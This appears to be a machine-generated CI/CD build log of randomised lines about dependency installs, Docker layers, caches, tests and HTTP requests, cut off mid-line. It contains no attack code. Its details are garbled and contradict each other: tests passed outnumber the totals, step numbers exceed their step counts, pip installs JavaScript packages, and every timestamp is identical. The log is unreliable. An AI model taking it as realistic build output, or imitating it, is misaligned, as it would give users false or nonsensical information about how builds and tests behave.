request\nCache saved successfully\nGenerating source maps...\nnpm notice: created a lockfile\nArtifact uploaded: dist.zip (49MB)\nStep 14/24: Deploying\nUsing Node.js 15.1.0\npip: Collecting eslint\nCompiling lib/handler.rs...\n[12:18:08] DEBUG: Initializing service\npip: Installing build dependencies...\nProcessing...\nArtifact uploaded: build.tar.gz (9MB)\nTest Suites: 22 passed, 5 total\n[12:18:08] DEBUG: Connection pool: 7 active\nCompiling lib/main.py...\nProcessing...\n[12:18:08] DEBUG: Initializing service\nSuccess!\nSnapshots: 14 passed, 31 total\nPulling image: alpine:latest\n[12:18:08] DEBUG: Query executed in 12ms\nLayer 8/13: COPY command\nChecking out master branch\nLoading...\nCache restored successfully (312MB)\n[12:18:08] INFO: Processing request\n\u2717 build failed with exit code 56\nLoading...\nArtifact uploaded: dist.zip (25MB)\nCache miss for key-1720\n\u2713 Step 'install' succeeded\nDone.\nCompiling utils/index.js...\nPulling image: python:3.11\nStep 18/15: Linting\nArtifact uploaded: build.tar.gz (46MB)\nSuccess!\nFetching submodules...\npip install: Successfully installed webpack-5.15\nLayer 9/8: ENV command\nPushing to registry...\nSwitched to branch 'hotfix/task-429'\nDone.\n[12:18:08] DEBUG: Connection pool: 15 active\nCompiling components/app.ts...\nCache restored successfully (88MB)\nNODE_ENV=production\nnpm notice: created a lockfile\nReady.\nWaiting...\nBuilding Docker image...\n[12:18:08] DEBUG: Memory usage: 1435MB\nGenerating source maps...\nUsing Node.js 16.8.10\n[12:18:08] INFO: Connecting to database\n\u2713 Task completed in 1129ms\nStep 10/16: Installing dependencies\n\u2713 test completed\nWARNING: axios has known vulnerabilities\nSnapshots: 13 passed, 35 total\n[12:18:08] ERROR: Connection failed\nCompiling lib/app.ts...\nLayer 10/10: ENV command\nnpm install: resolved 343 packages\n[12:18:08] WARN: Deprecated API usage\nSnapshots: 13 passed, 12 total\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFinished.\nCompiling components/app.ts...\nnpm notice: created a lockfile\nCoverage: 99% statements, 78% branches\npip: Collecting lodash\n  PASS: integration/test_user_create.spec.js\nPlatform: win32-x64\nHEAD is now at df396e6\nOptimizing 73 modules...\nFinished.\nFinished.\npip install: Successfully installed axios-3.19\nCompiling components/handler.rs...\n\u2713 Task completed in 4480ms\n\u2713 Step 'setup' succeeded\nArtifact downloaded: 5MB\nSuccess!\nCoverage: 80% statements, 93% branches\nTime: 87.922s\nRan 75 tests in 15s\n[12:18:08] DEBUG: Connection pool: 8 active\nCompiling src/index.js...\nCreating production build...\n[12:18:08] DEBUG: Connection pool: 4 active\nStep 20/22: Testing\nTime: 105.426s\nSnapshots: 39 passed, 2 total\nGET /api - 204 (20ms)\nException: ValueError\nGET /health - 200 (77ms)\nArtifact downloaded: 23MB\nLayer 9/8: COPY command\nnpm notice: created a lockfile\n[12:18:08] WARN: Deprecated API usage\nGenerating source maps...\nnpm install: resolved 168 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:18:08] INFO: Cache refreshed\nStep 19/25: Linting\nWARNING: lodash has known vulnerabilities\nGenerating source maps...\nAlready up to date.\nUploading artifact 'coverage' (24 files)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSnapshots: 14 passed, 22 total\n[12:18:08] DEBUG: Initializing service\nArtifact downloaded: 37MB\nTest Suites: 38 passed, 37 total\nTests: 83 passed, 434 total\n  PASS: test_db_connect (217ms)\nTest Suites: 44 passed, 42 total\nVerifying...\nException: NullPointerException\nArtifact uploaded: build.tar.gz (11MB)\nCache hit for key-9410\nGET /api - 200 (58ms)\nnpm notice: created a lockfile\nCompiling utils/main.py...\nTLS handshake completed\nPlatform: linux-x64\n\u2713 All checks passed\npip install: Successfully installed express-5.0\nReady.\nCompiling utils/utils.go...\npip: Collecting react\nProcessing...\nTransforming 648 files...\nFinished.\nCompiling lib/utils.go...\nImage pulled successfully\nUsing Python 3.9\nCache restored successfully (333MB)\nUsing Python 3.11\nEnvironment: development\nCompiling lib/app.ts...\nCache miss for key-9767\nStep 13/19: Deploying\nTransforming 712 files...\nException: ValueError\nProcessing...\nUsing Python 3.12\n[12:18:08] DEBUG: Initializing service\nCache restored successfully (395MB)\n\u2717 build failed with exit code 24\nUsing Node.js 14.13.5\n[12:18:08] DEBUG: Memory usage: 1072MB\nNODE_ENV=test\n=== Step e2e_tests completed ===\n=== Step: save_cache ===\nCompiling utils/handler.rs...\nDone.\nConnection established\nSwitched to branch 'hotfix/task-305'\n\u2713 Task completed in 4091ms\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: resolved 772 packages\nUsing Node.js 17.14.8\n[12:18:08] DEBUG: Connection pool: 6 active\nStep 17/23: Installing dependencies\n[12:18:08] INFO: Connecting to database\nUploading artifact 'build' (13 files)\nLoading...\nDone.\nDone.\nCreating production build...\nPlatform: win32-x64\nBuilding Docker image...\nBuilding Docker image...\nVerifying...\nCompleted.\nTransforming 527 files...\n[12:18:08] DEBUG: Query executed in 7ms\nCompleted.\nTests: 347 passed, 119 total\nLayer 1/10: RUN command\nLayer 7/10: RUN command\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBuilding Docker image...\nConnecting to test.io:443...\n\u2713 Step 'test' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 17/19: Linting\n[12:18:08] WARN: Deprecated API usage\nTLS handshake completed\nCache hit for key-3754\nUsing Node.js 19.12.8\nPushing to registry...\nCache miss for key-3498\nCache miss for key-3356\nCompiling src/index.js...\nCache hit for key-5318\nConnection established\nWARNING: webpack has known vulnerabilities\nStep 20/22: Installing dependencies\nCompiling lib/app.ts...\n[12:18:08] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTests: 119 passed, 339 total\nAlready up to date.\nCache miss for key-2544\nTime: 54.121s\nGET /health - 201 (12ms)\nWARNING: prettier has known vulnerabilities\nStep 2/16: Building\nTime: 35.408s\n[12:18:08] INFO: Cache refreshed\nGET /api - 204 (32ms)\nStep 15/19: Building\nLoading...\nWARNING: jest has known vulnerabilities\n[12:18:08] INFO: Starting build process\n[12:18:08] INFO: Connecting to database\nStep 8/16: Linting\nStep 5/16: Building\nMinifying vendor.js\nBundling styles.js\nCompiling src/utils.go...\nConnection established\nStep 5/25: Installing dependencies\nUsing Node.js 19.16.10\n[12:18:08] INFO: Request completed\nInstalling lodash@3.8.2\npip: Installing build dependencies...\nCache miss for key-8719\nChecking out master branch\n[12:18:08] WARN: Deprecated API usage\n[12:18:08] INFO: Processing request\n[12:18:08] DEBUG: Memory usage: 1347MB\nStep 18/23: Installing dependencies\nPushing to registry...\n[12:18:08] INFO: Request completed\nGenerating source maps...\nImage pulled successfully\nSuccess!\n[12:18:08] DEBUG: Memory usage: 1584MB\n[12:18:08] WARN: Deprecated API usage\nnpm install: added 30 packages\nArtifact uploaded: dist.zip (55MB)\nWARNING: express has known vulnerabilities\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 Task completed in 1458ms\nPushing to registry...\nyarn add: Done in 27.82s\nLayer 2/9: ENV command\nImage pulled successfully\nOptimizing 44 modules...\nStep 1/19: Testing\n\u2713 Step 'setup' succeeded\nLayer 8/10: COPY command\nChecking out master branch\nWARNING: lodash has known vulnerabilities\n[12:18:08] DEBUG: Query executed in 57ms\nCompiling components/handler.rs...\nFetching submodules...\nImage pulled successfully\nnpm notice: created a lockfile\nEnvironment: test\n[12:18:08] INFO: Connecting to database\nWARNING: jest has known vulnerabilities\nCache hit for key-9057\nFinished.\nCache saved successfully\n[12:18:08] INFO: Processing request\n  PASS: unit/test_cache_hit.spec.js\npip install: Successfully installed axios-2.2\nPlatform: darwin-arm64\nCoverage: 89% statements, 92% branches\nPulling image: alpine:latest\nStep 1/25: Deploying\nMinifying vendor.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSnapshots: 5 passed, 33 total\nCompiling lib/service.java...\nFAILED: test_api_health\nAlready up to date.\nCache restored successfully (309MB)\nStep 14/24: Linting\nPlatform: win32-x64\nOptimizing 81 modules...\nCache saved successfully\nBundling vendor.css\nStep 7/15: Installing dependencies\nCompleted.\nProcessing...\n[12:18:08] INFO: Cache refreshed\nHEAD is now at 53f2af2\n[12:18:08] DEBUG: Loading configuration\nHEAD is now at 2bb6e6a\n  PASS: e2e/test_auth_login.spec.js\nTransforming 494 files...\nRan 91 tests in 3s\nBundling styles.js\nCache hit for key-1518\nBuilding Docker image...\nBundling styles.css\nPushing to registry...\n[12:18:08] DEBUG: Initializing service\n[12:18:08] DEBUG: Initializing service\nCache invalidated: dependencies\nAlready up to date.\nStep 4/25: Testing\nLoading...\n[12:18:08] INFO: Processing request\nImage pulled successfully\nSwitched to branch 'hotfix/task-748'\nInstalling webpack@1.20.0\nUsing Node.js 16.11.7\nLoading...\nCache saved successfully\nnpm notice: package.json updated\n[12:18:08] INFO: Processing request\nTransforming 533 files...\nStep 4/25: Running migrations\nImage pulled successfully\nCache hit for key-9231\nBuilding Docker image...\nArtifact uploaded: dist.zip (60MB)\npip: Downloading lodash-2.8.tar.gz\nTransforming 701 files...\n[12:18:08] INFO: Connecting to database\nProcessing...\nCache saved successfully\nnpm notice: created a lockfile\nCache hit for key-8340\nCompiling src/main.py...\n[12:18:08] DEBUG: Loading configuration\nCompiling components/utils.go...\nHEAD is now at cb921f9\nGenerating source maps...\n[12:18:08] INFO: Request completed\nCache miss for key-7399\nFetching submodules...\nReady.\nStep 6/17: Linting\nDone.\nDone.\nInstalling jest@3.19.2\nArtifact uploaded: build.tar.gz (8MB)\nVerifying...\n=== Step save_cache completed ===\n=== Step: setup_environment ===\nTest Suites: 40 passed, 21 total\nMinifying vendor.js\nStep 11/18: Linting\n[12:18:08] ERROR: Connection failed\nEnvironment: development\nAlready up to date.\n[12:18:08] INFO: Cache refreshed\nCache hit for key-4250\nInstalling jest@3.9.5\nGenerating source maps...\n[12:18:08] DEBUG: Memory usage: 868MB\nPushing to registry...\nnpm install: resolved 869 packages\nArtifact downloaded: 50MB\nVerifying...\nTest Suites: 19 passed, 35 total\nOK\n[12:18:08] INFO: Request completed\nBuilding Docker image...\n[12:18:08] INFO: Connecting to database\nAlready up to date.\n[12:18:08] INFO: Request completed\nStep 8/18: Linting\nStep 6/22: Deploying\nLayer 9/11: RUN command\nTest Suites: 47 passed, 37 total\nVerifying...\nWaiting...\nException: RuntimeError\n[12:18:08] WARN: Deprecated API usage\nLoading...\npip: Downloading axios-5.10.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOptimizing 27 modules...\nGenerating source maps...\nUsing Node.js 18.15.5\nNODE_ENV=development\nVerifying...\n\u2713 test completed\nTLS handshake completed\n\u2713 package completed\npip install: Successfully installed webpack-4.3\n[12:18:08] DEBUG: Connection pool: 7 active\npip: Downloading express-2.18.tar.gz\nWARNING: webpack has known vulnerabilities\nUploading artifact 'dist' (49 files)\nArtifact uploaded: dist.zip (35MB)\nnpm notice: package.json updated\nNODE_ENV=production\nStep 8/18: Running migrations\nWARNING: express has known vulnerabilities\nStep 18/16: Deploying\nAlready up to date.\nArtifact uploaded: dist.zip (76MB)\nOK\nUploading artifact 'dist' (30 files)\nBuilding Docker image...\nAlready up to date.\nnpm install: added 71 packages\nSwitched to branch 'hotfix/task-514'\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: prettier has known vulnerabilities\nStep 12/21: Installing dependencies\nCompiling src/index.js...\nTests: 482 passed, 206 total\n[12:18:08] DEBUG: Loading configuration\nCompiling src/handler.rs...\nyarn add: Done in 27.13s\nStep 1/19: Installing dependencies\nCache invalidated: dependencies\nBundling runtime.js\nOptimizing 42 modules...\nInstalling react@5.2.0\npip: Downloading axios-1.15.tar.gz\nnpm install: resolved 816 packages\n[12:18:08] ERROR: Connection failed\nPOST /api - 200 (112ms)\nStep 4/19: Deploying\nPulling image: alpine:18\nUploading artifact 'dist' (25 files)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:18:08] INFO: Cache refreshed\nSwitched to branch 'feature/task-812'\nCoverage: 77% statements, 89% branches\npip: Downloading express-4.8.tar.gz\npip install: Successfully installed react-3.9\n[12:18:08] DEBUG: Memory usage: 984MB\npip: Collecting express\nyarn add: Done in 28.60s\nAlready up to date.\n[12:18:08] DEBUG: Loading configuration\nCompiling lib/main.py...\npip: Collecting webpack\nCompiling src/service.java...\n\u2713 Task completed in 1431ms\n[12:18:08] ERROR: Connection failed\nInstalling lodash@2.15.6\nTime: 19.408s\nWARNING: axios has known vulnerabilities\nProcessing...\nCompiling components/handler.rs...\n[12:18:08] DEBUG: Connection pool: 14 active\nCache invalidated: dependencies\nTest Suites: 24 passed, 39 total\n[12:18:08] DEBUG: Loading configuration\nInstalling express@1.7.4\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:18:08] ERROR: Connection failed\nUploading artifact 'dist' (20 files)\n\u2717 build failed with exit code 41\nCache saved successfully\nStep 6/16: Installing dependencies\nSwitched to branch 'feature/task-433'\n\u2713 All checks passed\nStep 4/18: Installing dependencies\n\u2713 All checks passed\nRan 171 tests in 54s\nNODE_ENV=production\nWARNING: react has known vulnerabilities\nCompleted.\nLoading...\n\u2713 All checks passed\nPlatform: linux-x64\n[12:18:08] DEBUG: Memory usage: 1061MB\nLayer 1/8: ENV command\nLoading...\nTransforming 409 files...\npip: Downloading express-2.15.tar.gz\nChecking out main branch\n[12:18:08] DEBUG: Memory usage: 1278MB\npip install: Successfully installed axios-3.18\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (32MB)\nFinished.\n[12:18:08] INFO: Cache refreshed\nTime: 3.508s\nLayer 6/8: ENV command\nCache saved successfully\nSnapshots: 33 passed, 18 total\n[12:18:08] INFO: Request completed\nnpm install: added 322 packages\n[12:18:08] DEBUG: Connection pool: 14 active\nCache hit for key-3913\nImage pulled successfully\nCache invalidated: build\nnpm install: resolved 708 packages\nnpm install: resolved 1088 packages\n[12:18:08] INFO: Request completed\nSwitched to branch 'bugfix/task-441'\n\u2713 Task completed in 3459ms\nWARNING: jest has known vulnerabilities\n  PASS: unit/test_cache_hit.spec.js\n[12:18:08] WARN: Deprecated API usage\nPOST /data - 202 (376ms)\n[12:18:08] INFO: Request completed\nWARNING: lodash has known vulnerabilities\nLayer 6/12: RUN command\nnpm notice: package.json updated\nTests: 409 passed, 352 total\nCache saved successfully\nConnection established\n[12:18:08] WARN: Deprecated API usage\nStep 18/25: Deploying\n[12:18:08] DEBUG: Initializing service\n[12:18:08] ERROR: Connection failed\nnpm notice: created a lockfile\nFinished.\nAlready up to date.\nArtifact uploaded: build.tar.gz (12MB)\nPulling image: node:3.11\n[12:18:08] ERROR: Connection failed\nCompiling src/service.java...\npip install: Successfully installed react-5.6\nGenerating source maps...\npip install: Successfully installed eslint-4.10\nyarn add: Done in 29.4s\nOK\nCompiling components/service.java...\nCache miss for key-1053\n[12:18:08] INFO: Cache refreshed\nCompiling lib/main.py...\nNODE_ENV=production\n[12:18:08] DEBUG: Memory usage: 1879MB\nGenerating source maps...\nCache hit for key-9456\nyarn add: Done in 24.78s\nArtifact uploaded: build.tar.gz (33MB)\nFAILED: test_api_health\nTLS handshake completed\n[12:18:08] DEBUG: Initializing service\npip: Downloading eslint-3.12.tar.gz\nBuilding Docker image...\nTLS handshake completed\n[12:18:08] DEBUG: Connection pool: 4 active\n=== Step setup_environment completed ===\n=== Step: setup_node ===\nStep 20/18: Running migrations\nVerifying...\nFinished.\nCache invalidated: node_modules\n  PASS: unit/test_user_create.spec.js\n[12:18:08] INFO: Connecting to database\nCoverage: 89% statements, 91% branches\nUsing Node.js 17.3.6\nProcessing...\nnpm install: added 162 packages\nWARNING: axios has known vulnerabilities\n\u2713 test completed\n[12:18:08] DEBUG: Connection pool: 9 active\n  PASS: test_cache_hit (268ms)\n[12:18:08] INFO: Connecting to database\nBuilding Docker image...\nCache saved successfully\nFAILED: test_cache_hit\n\u2713 Task completed in 1738ms\nStep 6/25: Building\nSuccess!\nCompiling lib/service.java...\nSnapshots: 33 passed, 47 total\nCache restored successfully (452MB)\n[12:18:08] DEBUG: Initializing service\nPulling image: alpine:18\nCompiling src/handler.rs...\nStep 4/21: Building\nImage pulled successfully\nCache miss for key-2676\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nConnection established\nUsing Python 3.10\n\u2717 build failed with exit code 115\nEnvironment: staging\nArtifact downloaded: 49MB\nCache hit for key-1429\nCompiling components/handler.rs...\nSnapshots: 40 passed, 18 total\nCache restored successfully (241MB)\nCache restored successfully (407MB)\n[12:18:08] DEBUG: Query executed in 43ms\n[12:18:08] DEBUG: Connection pool: 14 active\nStep 18/25: Deploying\nPOST /api - 200 (121ms)\nArtifact uploaded: dist.zip (96MB)\n  PASS: test_auth_login (176ms)\nNODE_ENV=production\n[12:18:08] DEBUG: Connection pool: 12 active\nChecking out develop branch\nReady.\nArtifact uploaded: build.tar.gz (12MB)\nWARNING: lodash has known vulnerabilities\n[12:18:08] DEBUG: Query executed in 77ms\nCompiling src/service.java...\nWARNING: axios has known vulnerabilities\nCompiling lib/main.py...\nPOST /api - 201 (338ms)\nPlatform: win32-x64\nCompiling components/utils.go...\nTime: 52.394s\nCache saved successfully\nNODE_ENV=test\nPushing to registry...\n[12:18:08] INFO: Connecting to database\nCompiling lib/main.py...\nStep 16/24: Deploying\nStep 9/24: Testing\nnpm notice: created a lockfile\nLayer 3/12: COPY command\nInstalling express@3.19.3\n[12:18:08] INFO: Cache refreshed\nnpm notice: created a lockfile\n[12:18:08] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nHEAD is now at 4d06190\npip: Collecting lodash\n\u2713 Task completed in 1135ms\n\u2713 Task completed in 1954ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTLS handshake completed\nHEAD is now at 7185eaf\nUsing Node.js 15.1.4\nUsing Node.js 14.3.10\nCache saved successfully\n[12:18:08] INFO: Cache refreshed\nSwitched to branch 'hotfix/task-965'\nBundling runtime.css\nTime: 20.718s\n[12:18:08] INFO: Cache refreshed\nStep 13/24: Installing dependencies\nnpm install: resolved 201 packages\nRan 125 tests in 14s\n[12:18:08] WARN: Deprecated API usage\nConnecting to cloud.services:443...\nUsing Node.js 15.4.9\nTests: 156 passed, 430 total\nCompiling utils/utils.go...\nFinished.\nRan 36 tests in 4s\nConnecting to test.io:443...\nTransforming 366 files...\n[12:18:08] WARN: Deprecated API usage\nAlready up to date.\nWaiting...\nStep 18/24: Testing\n[12:18:08] DEBUG: Connection pool: 15 active\nCache saved successfully\nArtifact uploaded: dist.zip (21MB)\n[12:18:08] DEBUG: Connection pool: 9 active\nGET /api - 200 (6ms)\n[12:18:08] WARN: Deprecated API usage\nWaiting...\nGET /health - 200 (73ms)\nCompiling components/service.java...\nUsing Python 3.12\nTime: 94.476s\n[12:18:08] INFO: Starting build process\n[12:18:08] WARN: Deprecated API usage\nnpm notice: package.json updated\n\u2713 Step 'test' succeeded\nUsing Python 3.10\nPOST /upload - 201 (373ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 Task completed in 3220ms\nInstalling react@5.20.9\n\u2717 build failed with exit code 70\nUsing Python 3.12\nyarn add: Done in 1.40s\nnpm notice: created a lockfile\nException: RuntimeError\nCompiling utils/index.js...\nStep 3/17: Testing\nDone.\n\u2713 Task completed in 3191ms\nImage pulled successfully\nGenerating source maps...\nHEAD is now at e5ca6f0\nCache saved successfully\n[12:18:08] DEBUG: Connection pool: 12 active\nnpm notice: created a lockfile\n  PASS: integration/test_db_connect.spec.js\nVerifying...\nSnapshots: 43 passed, 3 total\n[12:18:08] INFO: Processing request\n[12:18:08] INFO: Starting build process\nCreating production build...\n\u2713 Step 'build' succeeded\nWARNING: prettier has known vulnerabilities\nTest Suites: 40 passed, 19 total\nUsing Node.js 18.14.3\nFetching submodules...\nOptimizing 86 modules...\nyarn add: Done in 5.88s\n[12:18:08] DEBUG: Loading configuration\nAlready up to date.\nyarn add: Done in 25.37s\nConnecting to example.com:443...\nTransforming 519 files...\nLayer 3/9: RUN command\nGET /api - 204 (41ms)\n\u2713 Task completed in 3469ms\n[12:18:08] DEBUG: Loading configuration\n[12:18:08] DEBUG: Connection pool: 17 active\nConnecting to test.io:443...\n[12:18:08] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBundling styles.css\nCache hit for key-2083\npip: Installing build dependencies...\nOK\nStep 1/19: Running migrations\nReady.\n[12:18:08] DEBUG: Connection pool: 19 active\nCache miss for key-1069\nProcessing...\nUsing Node.js 19.6.0\nPlatform: win32-x64\nWARNING: prettier has known vulnerabilities\n[12:18:08] ERROR: Connection failed\nDone.\nWaiting...\nLoading...\nInstalling webpack@4.11.1\nAlready up to date.\nTests: 244 passed, 448 total\nnpm notice: created a lockfile\n[12:18:08] INFO: Connecting to database\npip install: Successfully installed eslint-3.13\nUploading artifact 'coverage' (19 files)\nWARNING: prettier has known vulnerabilities\nSwitched to branch 'hotfix/task-972'\nInstalling lodash@3.2.2\nTests: 343 passed, 54 total\n=== Step setup_node completed ===\n=== Step: lint ===\n\u2713 All checks passed\n[12:18:08] WARN: Deprecated API usage\n[12:18:08] WARN: Deprecated API usage\n[12:18:08] DEBUG: Memory usage: 1644MB\n[12:18:08] DEBUG: Connection pool: 16 active\nUploading artifact 'build' (19 files)\n[12:18:08] DEBUG: Memory usage: 1254MB\nyarn add: Done in 7.83s\nOK\n[12:18:08] DEBUG: Loading configuration\nTest Suites: 41 passed, 39 total\nHEAD is now at ac73a96\nCache hit for key-9768\nCompiling src/index.js...\nGenerating source maps...\nUploading artifact 'dist' (40 files)\nAlready up to date.\nUsing Python 3.9\nCoverage: 95% statements, 86% branches\nnpm notice: created a lockfile\nSnapshots: 17 passed, 15 total\nStep 7/25: Installing dependencies\nFinished.\n[12:18:08] DEBUG: Memory usage: 1533MB\n[12:18:08] DEBUG: Memory usage: 911MB\nLoading...\nConnection established\npip: Installing build dependencies...\nyarn add: Done in 5.23s\nCache restored successfully (231MB)\nCache invalidated: build\nSuccess!\nRan 128 tests in 40s\nPOST /api - 202 (441ms)\nOK\npip install: Successfully installed prettier-1.3\nTests: 196 passed, 136 total\nBundling vendor.css\nWaiting...\nWARNING: lodash has known vulnerabilities\nCache miss for key-3499\nCompiling utils/handler.rs...\nSnapshots: 4 passed, 1 total\nStep 15/15: Running migrations\nTests: 116 passed, 467 total\nLoading...\nCompleted.\nPlatform: win32-x64\nLoading...\nCompiling src/utils.go...\nGET /health - 200 (71ms)\nException: RuntimeError\n\u2713 Task completed in 3339ms\nCache saved successfully\nPulling image: alpine:3.11\nUsing Node.js 17.8.3\nSwitched to branch 'feature/task-813'\nAlready up to date.\nOK\nHEAD is now at 528ff2a\n[12:18:08] DEBUG: Loading configuration\npip: Downloading prettier-3.12.tar.gz\n\u2717 build failed with exit code 79\nChecking out master branch\nFetching submodules...\nRan 38 tests in 31s\nStep 15/18: Linting\nyarn add: Done in 28.20s\nUploading artifact 'dist' (27 files)\nBuilding Docker image...\nBuilding Docker image...\nSnapshots: 16 passed, 28 total\nTests: 366 passed, 391 total\npip: Installing build dependencies...\nTest Suites: 11 passed, 45 total\nSwitched to branch 'hotfix/task-509'\nnpm notice: created a lockfile\nDone.\nTime: 67.179s\nGET /api - 204 (74ms)\nUploading artifact 'build' (38 files)\nException: TypeError\nArtifact downloaded: 33MB\nTests: 204 passed, 93 total\n[12:18:08] INFO: Request completed\nCompiling utils/main.py...\nTime: 73.162s\nCache miss for key-1828\npip: Downloading eslint-2.14.tar.gz\nArtifact uploaded: build.tar.gz (20MB)\n  PASS: test_auth_login (490ms)\nRan 137 tests in 51s\nArtifact uploaded: build.tar.gz (30MB)\nCoverage: 95% statements, 83% branches\nSwitched to branch 'bugfix/task-332'\nyarn add: Done in 12.93s\nCompleted.\nFinished.\nCompleted.\n[12:18:08] INFO: Processing request\nSuccess!\nReady.\n[12:18:08] DEBUG: Initializing service\n[12:18:08] INFO: Starting build process\n[12:18:08] INFO: Connecting to database\n  PASS: unit/test_db_connect.spec.js\nGenerating source maps...\nCache invalidated: build\nCreating production build...\npip: Installing build dependencies...\nWARNING: express has known vulnerabilities\nSnapshots: 36 passed, 39 total\npip: Downloading express-1.10.tar.gz\nUsing Node.js 18.17.4\n\u2713 Step 'test' succeeded\nBuilding Docker image...\nCache miss for key-6433\nStep 15/18: Linting\nChecking out master branch\nStep 20/22: Installing dependencies\n\u2717 build failed with exit code 107\nStep 10/15: Deploying\nBundling main.js\nUsing Node.js 17.3.5\npip: Downloading react-1.6.tar.gz\nPushing to registry...\nCompiling components/index.js...\nHEAD is now at bbfddf0\nHEAD is now at 9957ca6\n[12:18:08] INFO: Cache refreshed\nPOST /api - 202 (267ms)\nCache saved successfully\nStep 7/15: Deploying\nPulling image: alpine:latest\n[12:18:08] ERROR: Connection failed\n  PASS: unit/test_api_health.spec.js\nUploading artifact 'build' (23 files)\nTLS handshake completed\nFAILED: test_db_connect\nSuccess!\n\u2713 All checks passed\n[12:18:08] INFO: Starting build process\nUsing Python 3.11\n[12:18:08] DEBUG: Memory usage: 605MB\nCompiling components/service.java...\nConnection established\n[12:18:08] INFO: Starting build process\nBuilding Docker image...\nArtifact uploaded: build.tar.gz (24MB)\nProcessing...\nPushing to registry...\nCache restored successfully (372MB)\nCache miss for key-9148\nBundling vendor.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nImage pulled successfully\nCache hit for key-6303\n[12:18:08] DEBUG: Connection pool: 7 active\nCache saved successfully\nCreating production build...\nCache restored successfully (391MB)\nTime: 51.157s\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSwitched to branch 'bugfix/task-942'\nChecking out master branch\nPlatform: linux-x64\nArtifact uploaded: build.tar.gz (5MB)\n\u2717 build failed with exit code 106\nStep 4/16: Installing dependencies\nCoverage: 73% statements, 77% branches\nBuilding Docker image...\nCache saved successfully\nCompiling src/utils.go...\nWaiting...\nnpm install: resolved 928 packages\nNODE_ENV=test\nWaiting...\nnpm notice: package.json updated\nEnvironment: test\nFinished.\nSwitched to branch 'feature/task-129'\npip: Installing build dependencies...\nEnvironment: production\n[12:18:08] DEBUG: Connection pool: 8 active\n[12:18:08] DEBUG: Loading configuration\n[12:18:08] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling lib/main.py...\nWARNING: lodash has known vulnerabilities\npip install: Successfully installed axios-1.13\n[12:18:08] DEBUG: Memory usage: 753MB\nVerifying...\nException: ValueError\n=== Step lint completed ===\n=== Step: checkout ===\nCache saved successfully\nUsing Node.js 14.20.2\nCompiling components/app.ts...\nGenerating source maps...\nnpm install: added 283 packages\nCompiling components/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBuilding Docker image...\nCreating production build...\nUsing Node.js 16.6.4\nEnvironment: production\nProcessing...\n[12:18:08] WARN: Deprecated API usage\n[12:18:08] DEBUG: Query executed in 39ms\nMinifying app.js\nFinished.\nCreating production build...\nReady.\nCompiling components/app.ts...\nBundling runtime.js\n\u2713 validate completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 All checks passed\nStep 18/19: Building\nTLS handshake completed\nEnvironment: development\nException: RuntimeError\nPushing to registry...\nUsing Python 3.9\nFinished.\n\u2713 Task completed in 3975ms\n[12:18:08] INFO: Request completed\npip: Collecting express\nArtifact downloaded: 35MB\nTLS handshake completed\nOptimizing 76 modules...\nBuilding Docker image...\n[12:18:08] DEBUG: Initializing service\nBuilding Docker image...\n[12:18:08] INFO: Request completed\n[12:18:08] DEBUG: Memory usage: 1950MB\nStep 4/17: Linting\n[12:18:08] INFO: Connecting to database\nCache invalidated: dependencies\nStep 1/15: Installing dependencies\nCache restored successfully (100MB)\nGET /health - 200 (56ms)\nGenerating source maps...\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPOST /upload - 201 (69ms)\n  PASS: unit/test_user_create.spec.js\nStep 17/25: Linting\nSwitched to branch 'bugfix/task-869'\nTransforming 296 files...\nCompiling lib/utils.go...\nRan 90 tests in 36s\nEnvironment: production\nCache hit for key-9691\nPlatform: darwin-arm64\nCache miss for key-9887\nUsing Node.js 20.5.7\npip install: Successfully installed lodash-1.2\nTest Suites: 23 passed, 43 total\nImage pulled successfully\nUsing Node.js 16.10.10\n[12:18:08] WARN: Deprecated API usage\nProcessing...\n\u2713 All checks passed\nCreating production build...\npip: Downloading jest-1.1.tar.gz\nPlatform: win32-x64\nConnecting to startup.dev:443...\nnpm notice: package.json updated\nTLS handshake completed\nStep 19/21: Linting\nTests: 187 passed, 176 total\nyarn add: Done in 4.35s\nHEAD is now at 8fb0a74\nFinished.\npip: Downloading eslint-4.8.tar.gz\nChecking out develop branch\nStep 4/25: Testing\nGenerating source maps...\n[12:18:08] DEBUG: Connection pool: 3 active\nReady.\nInstalling react@1.3.0\nConnection established\nUsing Python 3.9\nStep 8/18: Testing\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 2/18: Deploying\n\u2713 Step 'test' succeeded\nArtifact uploaded: build.tar.gz (38MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFinished.\nStep 20/16: Testing\nHEAD is now at c90edb1\nOptimizing 73 modules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 9/22: Running migrations\nPlatform: darwin-arm64\nCache saved successfully\n[12:18:08] DEBUG: Loading configuration\n\u2713 Task completed in 4436ms\nnpm notice: created a lockfile\n\u2713 lint completed\nSwitched to branch 'hotfix/task-495'\nLayer 6/13: 